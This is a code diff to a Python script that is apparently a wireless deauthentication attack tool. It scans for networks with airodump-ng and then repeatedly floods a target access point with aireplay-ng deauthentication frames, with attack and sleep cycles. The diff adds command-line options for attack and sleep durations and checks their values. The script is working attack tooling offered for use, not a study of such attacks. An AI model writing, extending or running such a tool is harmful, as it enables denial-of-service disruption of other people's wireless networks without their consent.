@@ -38,7 +38,7 @@ collectWifiNames = lambda : run( "sudo awk -F ',' '{ if ($1 ~ /Station/ || $1 ~ 
 
 
 
-def waiting( t = 15 ):
+def waiting( process = None, t = 15 ):
 
     sTime = time.time()
 
@@ -50,7 +50,7 @@ def waiting( t = 15 ):
 
         p = eTime / t
 
-        if t == 15:
+        if t == 15 and process == "captureProcess":
 
             line = f"\r{ green }Capturing wireless networks and informations: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"
 
@@ -180,7 +180,7 @@ def startDeAuth():
 
     process = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", project[ "bssid" ], project[ "interface" ] ], stdout = file, stderr = subprocess.PIPE )
 
-    dream( 25 )
+    dream( int( project[ "attack" ] ) )
 
     process.terminate()
 
@@ -240,7 +240,7 @@ def startDeAuth():
 
         start( restart = True )
 
-    waiting( int( project[ "sleep" ] ) )
+    waiting( t = int( project[ "sleep" ] ) )
 
     startDeAuth()
 
@@ -346,7 +346,7 @@ def createCaptureFiles():
 
     process = subprocess.Popen( [ "sudo", "airodump-ng", "-w", f"./{ project[ 'dirName' ] }/captureFile", "--output-format", "csv", project[ "interface" ] ], stdout = file )
 
-    waiting()
+    waiting( "captureProcess" )
 
     process.terminate()
 
@@ -442,6 +442,56 @@ def start( restart = False ):
 
 
 
+def getMoreOptions( option ):
+
+    if option.no_sleep:
+
+        project[ "attack" ] = 25
+
+        project[ "sleep" ] = 0
+
+    elif option.attack and option.sleep:
+
+        try:
+
+            if int( option.attack ) >= 25 and int( option.sleep ) >= 1:
+
+                project[ "attack" ] = option.attack
+
+                project[ "sleep" ] = option.sleep
+
+            else:
+
+                print( f"\n\n{ blue }The attack time must be at least 25 seconds and sleep time must be positive integer.\n\n" )
+
+                sys.exit( 0 )
+
+        except:
+
+            print( f"\n\n{ blue }The attack time must be at least 25 seconds and sleep time must be positive integer.\n\n" )
+
+            sys.exit( 0 )
+
+    elif option.attack or option.sleep:
+
+        print( f"\n\n{ blue }The option is missing.\n\n" )
+
+        sys.exit( 0 )
+
+    else:
+
+        project[ "attack" ] = 25
+
+        project[ "sleep" ] = 50
+
+
+
+
+
+
+
+
+
 def main():
 
     if checkDirLocation() == True:
@@ -452,11 +502,15 @@ def main():
 
         createOption.add_argument( "--no-sleep", action = "store_true", help = "Disable sleep mode" )
 
+        createOption.add_argument( "-s", "--sleep", type = str, help = "Time for sleep mode" )
+
+        createOption.add_argument( "-a", "--attack", type = str, help = "Time for attack mode" )
+
         option = createOption.parse_args()
 
         project[ "interface" ] = option.interface
 
-        project[ "sleep" ] = 0 if option.no_sleep else 50
+        getMoreOptions( option )
 
         run( "sudo clear" )
 
@@ -493,7 +547,6 @@ def main():
 if __name__ == "__main__":
 
     main()
-
 
 
 
